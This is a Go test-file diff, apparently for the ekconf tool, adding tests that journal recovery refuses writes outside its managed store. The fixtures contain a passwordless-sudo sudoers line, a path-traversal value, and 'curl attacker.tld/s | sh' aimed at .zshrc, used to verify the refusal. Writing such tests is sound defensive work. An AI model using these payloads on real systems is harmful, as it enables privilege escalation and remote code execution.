@@ -7,6 +7,7 @@ import (
 	"path/filepath"
 	"testing"
 
+	"github.com/eznix86/ekconf/internal/config"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 )
@@ -54,9 +55,10 @@ func TestReplaceFilesAtomically_RollsBackOnSecondFailure(t *testing.T) {
 func TestRecoverPendingFileTransaction(t *testing.T) {
 	setupTestHome(t)
 
-	dir := t.TempDir()
-	firstPath := filepath.Join(dir, "first.txt")
-	secondPath := filepath.Join(dir, "second.txt")
+	firstPath, err := config.EncPath()
+	require.NoError(t, err)
+	secondPath, err := config.ConfigPath()
+	require.NoError(t, err)
 	journalPath, err := transactionJournalPath()
 	require.NoError(t, err)
 	require.NoError(t, os.MkdirAll(filepath.Dir(journalPath), 0o700))
@@ -85,4 +87,76 @@ func TestRecoverPendingFileTransaction(t *testing.T) {
 	_, err = os.Stat(journalPath)
 	require.Error(t, err)
 	assert.True(t, os.IsNotExist(err))
+}
+
+func TestRecoverPendingFileTransaction_RefusesPathOutsideStore(t *testing.T) {
+	setupTestHome(t)
+
+	victim := filepath.Join(t.TempDir(), "sudoers.d", "pwn")
+	require.NoError(t, os.MkdirAll(filepath.Dir(victim), 0o755))
+
+	journal, err := transactionJournalPath()
+	require.NoError(t, err)
+	require.NoError(t, os.MkdirAll(filepath.Dir(journal), 0o700))
+
+	payload, err := json.Marshal(fileTransaction{Updates: []journalUpdate{
+		{Path: victim, Data: []byte("brunobernard ALL=(ALL) NOPASSWD: ALL\n")},
+	}})
+	require.NoError(t, err)
+	require.NoError(t, os.WriteFile(journal, payload, 0o600))
+
+	err = recoverPendingFileTransaction()
+	require.ErrorContains(t, err, "not a file ekconf manages")
+
+	_, statErr := os.Stat(victim)
+	assert.True(t, os.IsNotExist(statErr), "attacker-chosen path must not be written")
+}
+
+func TestRecoverPendingFileTransaction_RefusesTraversalIntoStore(t *testing.T) {
+	setupTestHome(t)
+
+	dir, err := config.Dir()
+	require.NoError(t, err)
+	victim := filepath.Join(dir, "..", ".zshrc")
+
+	journal, err := transactionJournalPath()
+	require.NoError(t, err)
+	require.NoError(t, os.MkdirAll(filepath.Dir(journal), 0o700))
+
+	payload, err := json.Marshal(fileTransaction{Updates: []journalUpdate{
+		{Path: victim, Data: []byte("curl attacker.tld/s | sh\n")},
+	}})
+	require.NoError(t, err)
+	require.NoError(t, os.WriteFile(journal, payload, 0o600))
+
+	err = recoverPendingFileTransaction()
+	require.ErrorContains(t, err, "not a file ekconf manages")
+
+	_, statErr := os.Stat(filepath.Clean(victim))
+	assert.True(t, os.IsNotExist(statErr), "traversal out of ~/.ekube must not be written")
+}
+
+func TestRecoverPendingFileTransaction_AllowsManagedPaths(t *testing.T) {
+	setupTestHome(t)
+
+	encPath, err := config.EncPath()
+	require.NoError(t, err)
+	journal, err := transactionJournalPath()
+	require.NoError(t, err)
+	require.NoError(t, os.MkdirAll(filepath.Dir(journal), 0o700))
+
+	payload, err := json.Marshal(fileTransaction{Updates: []journalUpdate{
+		{Path: encPath, Data: []byte("recovered")},
+	}})
+	require.NoError(t, err)
+	require.NoError(t, os.WriteFile(journal, payload, 0o600))
+
+	require.NoError(t, recoverPendingFileTransaction())
+
+	data, err := os.ReadFile(encPath)
+	require.NoError(t, err)
+	assert.Equal(t, []byte("recovered"), data)
+
+	_, statErr := os.Stat(journal)
+	assert.True(t, os.IsNotExist(statErr), "journal must be consumed")
 }
